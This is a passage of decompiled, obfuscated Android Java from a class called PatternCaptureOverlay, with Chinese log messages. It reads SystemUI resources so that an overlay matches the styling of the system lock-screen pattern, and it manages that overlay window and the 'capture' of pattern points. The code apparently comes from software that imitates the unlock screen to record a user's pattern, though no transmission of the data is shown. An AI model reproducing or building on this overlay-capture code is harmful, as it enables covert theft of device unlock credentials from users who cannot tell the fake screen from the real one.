                if (iM211842a5 == 0) {
                }
                int i8222 = iM211842a5;
                t60.m214714d6("PatternCaptureOverlay", "★ SystemUI资源读取成功: haloSize=" + i2 + "px, innerDot=" + i3 + "px, dotSelected=" + dimensionPixelSize522 + "px, pathWidth=" + i522 + "px, dotColor=#" + Integer.toHexString(i7222) + ", pathColor=#" + Integer.toHexString(i8222) + ", outerCircleAlpha=" + f422);
                return new xm0(i2, i3, dimensionPixelSize522, i7222, i8222, i522, f422);
            } catch (Exception e2) {
                e = e2;
                t60.m214695b6("读取SystemUI资源失败: " + e.getMessage(), "msg");
                return xm0Var;
            }
        } catch (Exception e3) {
            e = e3;
            xm0Var = null;
        }
    }

    /* renamed from: b0 */
    public final void m211847b0() {
        AtomicReference atomicReference = this.f53349a3;
        try {
            WindowManager windowManager = this.f53348a2;
            C0336a2 c0336a2 = (C0336a2) atomicReference.get();
            if (windowManager != null && c0336a2 != null) {
                t60.m214702c3("PatternCaptureOverlay", "removeViewImmediate patternView");
                windowManager.removeViewImmediate(c0336a2);
                c0336a2.f53341d0 = null;
            }
            this.f53352a6.set(null);
            atomicReference.set(null);
            t60.m214702c3("PatternCaptureOverlay", "isPatternListening: " + m211845a8());
        } catch (Exception e) {
            tz0.m214807a7("removePatternView error: ", e.getMessage(), "PatternCaptureOverlay");
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:14:0x002f A[Catch: all -> 0x0015, Exception -> 0x0017, TryCatch #1 {Exception -> 0x0017, blocks: (B:7:0x000f, B:12:0x0019, B:14:0x002f, B:15:0x0033), top: B:24:0x000f, outer: #0 }] */
    /* JADX WARN: Removed duplicated region for block: B:15:0x0033 A[Catch: all -> 0x0015, Exception -> 0x0017, TRY_LEAVE, TryCatch #1 {Exception -> 0x0017, blocks: (B:7:0x000f, B:12:0x0019, B:14:0x002f, B:15:0x0033), top: B:24:0x000f, outer: #0 }] */
    /* renamed from: b1 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void m211848b1(boolean z) {
        if (this.f53350a4.tryLock()) {
            try {
                if (z) {
                    this.f53351a5.clear();
                    this.f53353a7 = false;
                    if (t60.m214686a2(Looper.myLooper(), Looper.getMainLooper())) {
                    }
                } else {
                    try {
                        t60.m214702c3("PatternCaptureOverlay", "stopCapture: 不保存，丢弃已捕获点");
                        this.f53351a5.clear();
                        this.f53353a7 = false;
                        if (t60.m214686a2(Looper.myLooper(), Looper.getMainLooper())) {
                            this.f53359b3.post(new rm0(this, 0));
                        } else {
                            m211847b0();
                        }
                    } catch (Exception e) {
                        t60.m214704c5("PatternCaptureOverlay", "stopCapture error: " + e.getMessage());
                    }
                }
                this.f53350a4.unlock();
                t60.m214702c3("PatternCaptureOverlay", "isPatternListening: " + m211845a8());
            } catch (Throwable th) {
                this.f53350a4.unlock();
                throw th;
            }
        }
    }
}
